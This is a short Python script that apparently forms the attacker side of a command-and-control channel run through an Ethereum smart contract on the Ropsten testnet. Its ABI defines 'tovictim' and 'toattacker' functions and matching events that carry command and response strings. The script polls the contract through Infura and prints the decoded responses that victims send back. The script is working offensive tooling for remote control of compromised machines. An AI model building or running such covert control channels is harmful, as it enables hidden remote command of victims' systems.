from web3 import Web3
import time
import sys
import json


infura_key= "wss://ropsten.infura.io/ws/v3/PROJECT_ID"
web3 = Web3(Web3.WebsocketProvider(infura_key))
i=input("enter contract address:-")
abi=json.loads('[{"constant":false,"inputs":[{"name":"_response","type":"string"}],"name":"toattacker","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_command","type":"string"}],"name":"tovictim","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"command","type":"string"}],"name":"forvictim","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"command","type":"string"}],"name":"forattacker","type":"event"}]')
contract = web3.eth.contract(address=i, abi=abi)


def handle_event(event):
    transaction = web3.eth.getTransaction(event['transactionHash'].hex())
    print(contract.decode_function_input(transaction.input)[1])

def log_loop(event_filter, poll_interval):
    while True:
        for event in event_filter.get_new_entries():
            handle_event(event)
            time.sleep(poll_interval)

block_filter = web3.eth.filter({'fromBlock':'latest', 'address':i})
log_loop(block_filter, 2)
